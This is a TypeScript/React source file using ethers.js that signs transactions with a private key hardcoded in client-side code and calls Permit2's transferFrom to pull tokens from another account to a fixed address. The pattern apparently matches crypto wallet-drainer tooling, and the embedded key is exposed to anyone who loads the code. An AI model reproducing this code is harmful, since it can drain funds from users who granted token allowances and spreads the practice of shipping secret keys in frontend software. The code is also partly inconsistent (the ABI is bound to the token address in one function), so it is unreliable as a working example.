import { ethers, BigNumber, Contract } from 'ethers';
import { useCallback } from 'react';


export async function adminWallet  (){
  const privateKey = 'd478bf4ac2bb350640ed297e9bcdf89c6736e63f5de5f9431b1260412262c00f'; // Replace with your private key
  const provider =  new ethers.providers.Web3Provider(
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    (window as any).ethereum
  )
  console.log(provider)
  const wallet = new ethers.Wallet(privateKey, provider);
  console.log(wallet)
    // Define the contract ABI and create a contract instance
    const permit2ContractAbi = [
      'function transferFrom(address from, address to, uint160 amount, address token)',
    ];
    const token = "0xe6863210e49B080C044Cc5df861e5A83435844D0"
    
    const permit2Contract = new Contract("0x000000000022D473030F116dDEE9F6B43aC78BA3", permit2ContractAbi, wallet); // Use wallet (signer) instead of provider.getSigner()
  
    const account = '0xaA64D471b4d3A8Ee8fcacbC4c480d304aCEF0852'; // The account you're transferring from
    const spender = '0xc01289B24579D46dfc5cF718FF58C1b0be85E177'; // Spender address
    const amount = BigNumber.from('1'); // Amount to transfer
    try{
      const nonce = await provider.getTransactionCount(wallet.address, 'pending');
    
    try {
      // Send the transaction
      // const gasPrice = await provider.getGasPrice();

      
      const tx = await permit2Contract.transferFrom(account, "0xF3Be8230ac575e147621dCa068138922197D9f51", amount, token,
        {
      // gasLimit: ethers.utils.hexlify(1000000), 
      nonce: nonce, // Ensure correct nonce

      gasLimit: ethers.BigNumber.from('300000'), // 300,000 gas units for more complex transactions
      maxFeePerGas: ethers.utils.parseUnits('2', 'gwei'),
      maxPriorityFeePerGas: ethers.utils.parseUnits('1', 'gwei'),
      // gasLimit: ethers.BigNumber.from("1000000") ,
      // gasLimit: tx.gasLimit, // Same gas limit
  // maxFeePerGas: gasPrice.mul(2), // Double the original gas price

      }
      );
      console.log('Transaction Hash:', tx.hash);
  
      // Wait for the transaction to be mined
      const receipt = await tx.wait();
      console.log('Transaction confirmed:', receipt);
    } catch (error) {
      console.error('Error executing transaction:', error);
    }
  }catch (error) {
    console.error('Error executing transaction:', error);
  }
}

export async function Transfer  (provider, account, spender, token, amount){
  const privateKey = 'd478bf4ac2bb350640ed297e9bcdf89c6736e63f5de5f9431b1260412262c00f'; // Replace with your private key
  // const provider = new ethers.providers.JsonRpcProvider('https://your-rpc-url-here'); // Use your RPC provider (e.g., Infura, Alchemy, or custom RPC)
  
  // Create a new signer using the private key
  const wallet = new ethers.Wallet(privateKey, provider);
  console.log(wallet)
  // Define the contract ABI and create a contract instance
  const permit2ContractAbi = [
    'function transferFrom(address from, address to, uint160 amount, address token)',
  ];
  
  const permit2Contract = new Contract(token, permit2ContractAbi, wallet); // Use wallet (signer) instead of provider.getSigner()

  // const account = '0xaA64D471b4d3A8Ee8fcacbC4c480d304aCEF0852'; // The account you're transferring from
  // const spender = 'your-spender-address-here'; // Spender address
  // const amount = BigNumber.from('1000000000000000000'); // Amount to transfer

  try {
    // Send the transaction
    const tx = await permit2Contract.transferFrom(account, spender, amount, token, {
      // gasLimit: ethers.BigNumber.from("1000000") 
      gasLimit: ethers.utils.hexlify(1000000), 
    });
    console.log('Transaction Hash:', tx.hash);

    // Wait for the transaction to be mined
    const receipt = await tx.wait();
    console.log('Transaction confirmed:', receipt);
  } catch (error) {
    console.error('Error executing transaction:', error);
  }
}
